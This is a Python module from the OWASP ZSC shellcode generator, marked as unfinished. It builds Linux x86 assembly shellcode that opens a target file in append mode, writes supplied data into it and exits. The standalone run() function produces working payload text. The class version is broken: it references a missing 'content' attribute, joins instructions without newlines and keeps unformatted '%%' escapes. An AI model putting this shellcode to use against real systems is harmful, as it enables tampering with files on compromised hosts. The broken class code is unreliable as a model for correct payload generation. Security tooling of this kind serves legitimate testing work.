"""
OWASP ZSC
# TODO complete this module
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
"""
from owasp_zsc.new_cores import base_module
from owasp_zsc.new_cores import stack


def write(null, file_name, content, length):
    return '''
push   $0x5
pop    %%eax
%s
%s
mov    %%esp, %%ebx
push   $0x4014141
pop    %%ecx
shr    $0x10, %%ecx
int    $0x80
mov    %%eax, %%ebx
push   $0x4
pop    %%eax
%s
mov %%esp, %%ecx
%s
int    $0x80
mov    $0x1, %%al
mov    $0x1, %%bl
int    $0x80
''' % (str(null), str(file_name), str(content), str(length))


def run(data):
    path_file, content = data[0], data[1]
    null = len(path_file) % 4
    if null != 0:
        null = ''
    if null == 0:
        null = 'xor %ebx, %ebx\npush %ebx\n'
    return write(
        str(null), stack.generate(
            str(path_file), '%ebx', 'string'), stack.generate(
                str(content), '%ecx', 'string'), stack.generate(
                    str(len(content)), '%edx', 'int'))


class Module(base_module.BasePayload):
    file_dest = base_module.OptString("", "File Target")  # TODO improve descr
    data = base_module.OptString("", "File data")  # TODO improve descr

    def generate(self):
        null = len(self.file_dest) % 4
        if null != 0:
            null = ''
        else:
            null = 'xor %ebx, %ebx\npush %ebx\n'

        payload = "push   $0x5"
        payload += "pop    %%eax"
        payload += null
        payload += stack.generate(str(self.file_dest), '%ebx', 'string')
        payload += "mov    %%esp, %%ebx"
        payload += "push   $0x4014141"
        payload += "pop    %%ecx"
        payload += "shr    $0x10, %%ecx"
        payload += "int    $0x80"
        payload += "mov    %%eax, %%ebx"
        payload += "push   $0x4"
        payload += "pop    %%eax"
        payload += stack.generate(str(self.content), '%ecx', 'string')
        payload += "mov %%esp, %%ecx"
        payload += stack.generate(str(len(self.content)), '%edx', 'int')
        payload += "int    $0x80"
        payload += "mov    $0x1, %%al"
        payload += "mov    $0x1, %%bl"
        payload += "int    $0x80"
        return payload

    def run(self):
        print(self.generate())
